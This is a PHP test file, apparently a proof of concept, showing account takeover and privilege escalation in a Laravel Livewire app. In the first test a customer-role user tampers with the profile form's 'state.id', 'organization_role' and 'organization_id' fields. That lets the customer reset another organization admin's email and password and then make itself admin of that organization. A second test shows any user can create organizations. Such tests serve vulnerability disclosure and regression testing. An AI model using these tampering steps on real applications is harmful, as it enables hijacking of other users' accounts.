<?php
namespace Tests\Feature;
use App\Models\{User,Organization};
use Illuminate\Foundation\Testing\RefreshDatabase;
use App\Livewire\UpdateProfileInformationForm;
use Livewire\Livewire;
use Tests\TestCase;
class PocTest extends TestCase {
  use RefreshDatabase;
  public function test_customer_takes_over_other_org_admin(): void {
    $o=User::factory()->create(); $orgA = Organization::create(['name'=>'A','user_id'=>$o->id]); $orgB = Organization::create(['name'=>'B','user_id'=>$o->id]);
    $cust = User::factory()->create(['organization_id'=>$orgA->id,'organization_role'=>'customer']);
    $victim = User::factory()->create(['organization_id'=>$orgB->id,'organization_role'=>'admin']);
    $this->actingAs($cust);
    Livewire::test(UpdateProfileInformationForm::class)
      ->set('state.id', $victim->id)->set('state.email','evil@example.com')->set('state.password','Pwned12345!')
      ->call('updateProfileInformation');
    $this->assertEquals('evil@example.com', $victim->fresh()->email);
    $c = Livewire::test(UpdateProfileInformationForm::class)
      ->set('state.id', $cust->id)->set('state.organization_role','admin')->set('state.organization_id',$orgB->id)
      ->call('updateProfileInformation');
    $this->assertEquals('admin', $cust->fresh()->organization_role);
    $this->assertEquals($orgB->id, $cust->fresh()->organization_id);
  }
  public function test_any_user_creates_org(): void {
    $cust = User::factory()->create(['organization_role'=>'customer']);
    $this->actingAs($cust)->post('/organization',['name'=>'Rogue','user_id'=>$cust->id])->assertRedirect();
    $this->assertDatabaseHas('organizations',['name'=>'Rogue']);
  }
}
